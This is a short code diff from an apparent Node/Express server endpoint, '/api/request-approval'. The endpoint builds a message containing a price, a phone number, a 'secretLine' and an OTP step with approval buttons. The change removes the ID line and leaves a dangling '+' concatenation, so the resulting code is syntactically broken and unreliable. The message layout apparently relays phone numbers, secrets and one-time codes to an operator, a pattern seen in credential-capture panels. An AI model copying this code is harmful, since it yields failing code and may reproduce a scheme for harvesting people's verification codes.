@@ -86,7 +86,7 @@ app.post('/api/request-approval', async (req, res) => {
       `💰 Price: CDF ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine +
-      `🆔 ID: \`${id}\``;
+      
 
     const buttonRow =
       step === 'otp'
